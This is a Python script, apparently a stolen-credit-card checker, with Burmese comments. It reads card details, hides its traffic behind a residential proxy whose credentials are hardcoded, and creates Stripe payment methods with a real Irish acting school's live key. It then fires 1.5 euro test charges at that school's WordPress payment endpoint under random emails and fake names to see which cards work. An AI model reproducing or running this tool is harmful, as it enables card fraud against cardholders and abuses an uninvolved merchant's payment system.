import requests, re
import random
import string
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ==========================================
# 👇 PROXY SETTINGS (US Virginia Beach 🇺🇸 + Auto Retry)
# ==========================================
PROXY_HOST = 'geo.g-w.info'
PROXY_PORT = '10080'

# 🔥 မင်းရဲ့ Proxy User/Pass (ဒီအတိုင်းထားလိုက်တယ်)
PROXY_USER = 'user-RWTL64GEW8jkTBty-type-residential-session-xg0gkepv-country-US-city-Virginia_Beach-rotation-15'
PROXY_PASS = 'EJJT0uWaSUv4yUXJ'

# Proxy String တည်ဆောက်ခြင်း
proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
proxies = {
    'http': proxy_url,
    'https': proxy_url
}

def Tele(ccx):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]

        if "20" in yy:
            yy = yy.split("20")[1]

        letters = string.ascii_lowercase + string.digits
        random_name = ''.join(random.choice(letters) for i in range(10))
        random_email = f"{random_name}@gmail.com"

        # 🔥 RETRY SYSTEM (Connection ငြိမ်အောင်) 🔥
        session = requests.Session()
        retry = Retry(connect=3, backoff_factor=0.5)
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.proxies = proxies

        # ==========================================
        # Step 1: Create Payment Method (Stripe)
        # ==========================================
        # 🔥 Headers အသစ်
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        # 🔥 Payload အသစ် (Key အသစ် pk_live_51J8k... နဲ့)
        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51J8kG2G2tMgizZNRMjj44SnaRkCM7h2HBjLkazWyqrBE1NkCnsbFpxiq6xoPDfi5q0tB9ww94e6LlOXm9qlG4rkC001IGNVBQK'

        response = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=data,
            timeout=40 
        )

        if 'id' not in response.json():
            return "Proxy Error (PM Failed) ❌"
            
        pm = response.json()['id']

        # ==========================================
        # Step 2: Charge Request (Acting Academy)
        # ==========================================
        # 🔥 Acting Academy Headers
        headers = {
            'authority': 'actingacademy.ie',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://actingacademy.ie',
            'referer': 'https://actingacademy.ie/booking-payment/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        # 🔥 Acting Academy Data
        data = {
            'action': 'wp_full_stripe_inline_payment_charge',
            'wpfs-form-name': 'payment_form',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount-unique': '1.5',
            'wpfs-custom-input[]': [
                'Min Thant', # နာမည်ကတော့ မူရင်းအတိုင်းထားထားတယ်
                '19',
                'New York',
            ],
            'wpfs-card-holder-email': random_email, # 🔥 Random Email သုံးလိုက်ပြီ
            'wpfs-card-holder-name': 'Su Su',
            'wpfs-stripe-payment-method-id': f'{pm}',
        }

        response = session.post(
            'https://actingacademy.ie/wp-admin/admin-ajax.php',
            headers=headers,
            data=data,
            timeout=40
        )
        
        # Result စစ်ဆေးခြင်း
        try:
            # WP Full Stripe က success: true/false နဲ့ message ပြန်ပေးလေ့ရှိတယ်
            resp_json = response.json()
            if resp_json.get('success') == True:
                result = "Charged 1.5€ ✅"
            else:
                # Message ကိုဆွဲထုတ်မယ်
                result = resp_json.get('message', 'Decline⛔')
        except:
            if "Cloudflare" in response.text or response.status_code == 403:
                result = "IP Blocked by Site ❌"
            else:
                result = response.text # ဘာပြန်လာလဲမသိရင် text ထုတ်ကြည့်မယ်

    except Exception as e:
        result = f"Connection Failed (Retry Limit) ⚠️"
        
    return result
